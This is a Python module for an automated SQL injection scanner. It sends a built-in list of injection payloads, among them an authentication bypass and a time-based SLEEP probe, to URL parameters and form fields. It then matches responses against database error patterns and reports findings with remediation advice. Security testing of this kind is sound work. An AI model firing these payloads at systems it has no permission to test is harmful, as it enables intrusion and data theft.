import re
import urllib.parse
from typing import List, Dict, Any
import requests
import time

SQLI_PAYLOADS = [
    # Error based
    {"payload": "' OR '1'='1", "type": "boolean"},
    {"payload": "admin' --", "type": "auth_bypass"},
    {"payload": "' UNION SELECT NULL, NULL, NULL--", "type": "union"},
    {"payload": "\"'`", "type": "error_syntax"},
    {"payload": "1' ORDER BY 1--+", "type": "order_by"},
    {"payload": "1' AND SLEEP(2)--", "type": "time_based"}
]

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"postgresql.*?error",
    r"sqlite3::sqlexception",
    r"sqlite_error",
    r"syntax error in string in query expression",
    r"microsoft ole db provider for sql server",
    r"ora-[0-9]{5}",
    r"pg_query\(\): query failed"
]

def check_sqli_errors(text: str) -> str:
    for pat in SQL_ERROR_PATTERNS:
        match = re.search(pat, text, re.IGNORECASE)
        if match:
            return match.group(0)
    return ""

def scan_sqli(endpoints: List[Dict[str, Any]], headers: Dict[str, str], timeout: int = 6, log_callback=None) -> List[Dict[str, Any]]:
    findings = []
    
    for ep in endpoints:
        url = ep.get("url", "")
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # 1. Test Query Parameters
        if params:
            for param_name in params.keys():
                orig_val = params[param_name][0]
                
                # Baseline request
                try:
                    baseline_res = requests.get(url, headers=headers, timeout=timeout, verify=False)
                    base_len = len(baseline_res.text)
                    base_status = baseline_res.status_code
                except Exception:
                    continue

                for p_data in SQLI_PAYLOADS:
                    payload = p_data["payload"]
                    p_type = p_data["type"]
                    
                    test_params = dict(params)
                    test_params[param_name] = orig_val + payload
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ""))

                    if log_callback:
                        log_callback(f"Testing SQLi on {url} (param: {param_name}) with payload: {payload}")

                    start_time = time.time()
                    try:
                        res = requests.get(test_url, headers=headers, timeout=timeout, verify=False)
                        elapsed = time.time() - start_time
                        
                        # Check for error patterns
                        err_match = check_sqli_errors(res.text)
                        if err_match:
                            findings.append({
                                "category": "sqli",
                                "owasp_category": "A03:2021-Injection",
                                "severity": "Critical",
                                "title": f"Error-Based SQL Injection in parameter '{param_name}'",
                                "description": f"The parameter '{param_name}' reflected database error messages when injected with SQL syntax.",
                                "endpoint": url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Matched database error: '{err_match}' (HTTP {res.status_code}, Length {len(res.text)})",
                                "cvss_score": 9.8,
                                "cve_id": "CWE-89",
                                "remediation": "Use parameterized queries (Prepared Statements) or an ORM. Never concatenate user input directly into SQL strings."
                            })
                            break # Found critical flaw on this param

                        # Check for Boolean differential
                        if p_type == "boolean" and abs(len(res.text) - base_len) > 150 and res.status_code == 200:
                            findings.append({
                                "category": "sqli",
                                "owasp_category": "A03:2021-Injection",
                                "severity": "High",
                                "title": f"Boolean-Based SQL Injection in parameter '{param_name}'",
                                "description": f"Injecting boolean true payload altered the response size significantly from baseline ({len(res.text)} vs {base_len}).",
                                "endpoint": url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Response size changed from {base_len} to {len(res.text)} bytes.",
                                "cvss_score": 8.5,
                                "cve_id": "CWE-89",
                                "remediation": "Use prepared statements with parameterized queries."
                            })
                            break

                    except requests.exceptions.Timeout:
                        if p_type == "time_based":
                            findings.append({
                                "category": "sqli",
                                "owasp_category": "A03:2021-Injection",
                                "severity": "High",
                                "title": f"Time-Based Blind SQL Injection in parameter '{param_name}'",
                                "description": f"The application delayed response execution upon processing time delay payload.",
                                "endpoint": url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Request timed out / delayed > {timeout}s.",
                                "cvss_score": 8.6,
                                "cve_id": "CWE-89",
                                "remediation": "Ensure parameterized queries are used in all database abstraction layers."
                            })
                    except Exception:
                        pass

        # 2. Test Forms (POST / GET)
        forms = ep.get("forms", [])
        for form in forms:
            action_url = form.get("action", url)
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])

            for inp in inputs:
                inp_name = inp.get("name")
                if not inp_name: continue

                payload = "' OR '1'='1"
                post_data = {i.get("name"): (payload if i.get("name") == inp_name else "test") for i in inputs if i.get("name")}
                
                try:
                    if method == "POST":
                        res = requests.post(action_url, data=post_data, headers=headers, timeout=timeout, verify=False)
                    else:
                        res = requests.get(action_url, params=post_data, headers=headers, timeout=timeout, verify=False)

                    err = check_sqli_errors(res.text)
                    if err:
                        findings.append({
                            "category": "sqli",
                            "owasp_category": "A03:2021-Injection",
                            "severity": "Critical",
                            "title": f"SQL Injection in Form Input '{inp_name}'",
                            "description": f"Form at {action_url} is vulnerable to SQL injection on input field '{inp_name}'.",
                            "endpoint": action_url,
                            "parameter": inp_name,
                            "payload": payload,
                            "evidence": f"Error signature detected: {err}",
                            "cvss_score": 9.5,
                            "cve_id": "CWE-89",
                            "remediation": "Implement parameterized database statements on backend form handlers."
                        })
                except Exception:
                    pass

    return findings
